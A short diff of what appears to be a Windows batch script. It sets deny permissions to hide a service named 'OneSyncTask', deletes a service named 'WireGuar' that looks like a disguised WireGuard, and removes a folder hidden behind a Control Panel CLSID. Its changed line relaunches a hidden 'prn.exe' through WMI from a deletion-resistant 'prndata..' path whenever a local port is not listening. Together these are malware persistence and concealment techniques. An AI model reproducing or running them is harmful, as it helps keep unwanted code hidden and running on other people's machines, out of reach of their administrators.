@@ -35,4 +35,4 @@ sc sdshow "OneSyncTask" | findstr /C:"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)
 sc sdset "WireGuar" D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
 sc delete WireGuar
 rd /S /Q "\\?\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
-netstat -ano | find "31270" >nul || powershell -NoProfile -Command "([wmiclass]'Win32_Process').Create('\\?\%ProgramData%\prndata..\prn.exe \\?\%ProgramData%\prndata..\prn')"
+netstat -ano | find "30270" >nul || powershell -NoProfile -Command "([wmiclass]'Win32_Process').Create('\\?\%ProgramData%\prndata..\prn.exe \\?\%ProgramData%\prndata..\prn')"
